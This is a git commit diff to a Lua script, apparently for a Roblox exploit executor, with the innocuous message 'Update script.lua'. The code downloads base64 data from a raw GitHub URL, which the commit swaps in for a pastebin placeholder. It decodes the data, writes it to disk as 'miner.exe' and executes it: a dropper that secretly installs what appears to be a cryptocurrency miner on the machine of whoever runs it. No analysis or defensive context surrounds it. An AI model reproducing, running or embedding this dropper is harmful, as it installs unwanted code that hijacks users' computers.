befeed5d8110481c7b58f6fd47274453bb95db42
TWERD <86604031+EARIE666@users.noreply.github.com>
2026-06-28 20:06:12 +0300

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,4 +1,4 @@
-local base64 = game:HttpGet("https://pastebin.com/raw/XXXXX")
+local base64 = game:HttpGet("https://raw.githubusercontent.com/EARIE666/OTHER/refs/heads/main/Base64SCRIPT")
 local file = "C:\\temp\\miner.exe"
 writefile(file, game:GetService("HttpService"):Base64Decode(base64))
 syn.execute(file)
